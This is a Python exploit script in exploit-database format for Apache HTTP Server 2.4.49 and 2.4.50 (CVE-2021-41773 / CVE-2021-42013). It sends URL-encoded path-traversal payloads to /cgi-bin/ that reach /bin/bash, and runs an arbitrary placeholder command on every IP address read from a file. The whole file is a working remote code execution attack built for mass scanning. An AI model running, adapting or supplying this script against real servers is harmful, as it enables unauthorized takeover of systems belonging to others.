# Exploit Title: Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (3)
# Date: 11/11/2021
# Exploit Author: Sympthey
# Vendor Homepage: https://apache.org/
# Software Link: https://github.com/Balgogan/CVE-2021-41773
# Version: Apache 2.4.49/2.4.50 (CGI enabled)
# Tested on: Debian GNU/Linux
# CVE : CVE-2021-41773 / CVE-2021-42013
# Credits : Lucas Schnell
import requests
import sys
import threading
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


if len(sys.argv) < 2:
    print("Apache Version Not Passed\nExploit is for Apache servers 2.4.49 and 2.4.50 (CGI Enabled)")
    print(f"python {sys.argv[0]} <version> <ip_file>")
    sys.exit(0)

elif len(sys.argv) < 3:
    print("Failed to load ips, please define and IP list")
    print(f"python {sys.argv[0]} <version> <ip_file>")
    sys.exit(0)


# Command we are going to run on the target system
command = "ENTER COMMAND TO RUN UPON EXPLOIT EXECUTION"

# Get the apache version from the command line
apache_version = "".join(["2.4.50" if sys.argv[1] in ["2.4.50", ".50", "50"] else "2.4.49"])

# Read in a file from the command line
file_to_read = open(sys.argv[2], "r").readlines()


class Exploit(threading.Thread):
    def __init__(self, ip) -> None:
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
        self.url = f"http://{self.ip}"
        self.payloads = {
            "2.4.49": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash",
            "2.4.50": "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash"
            }

    def _execute(self) -> None:
        try:
            r = requests.post(f"{self.url}{self.payloads[apache_version]}", data=f"echo; {command}", timeout=5)
            if r.status_code == 200:
                print(f"[APACHE {apache_version}] {self.ip} Successfully Exploited")
            else:
                print(f"[APACHE {apache_version}] {self.ip} Failed to Exploit")
                
        except requests.exceptions.ConnectionError:
            print(f"[APACHE {apache_version}] {self.ip} Failed to Connect")

        except requests.exceptions.Timeout:
            print(f"[APACHE {apache_version}] {self.ip} Did not respond")

        except:
            pass

for ip in file_to_read:
    Exploit(ip)._execute()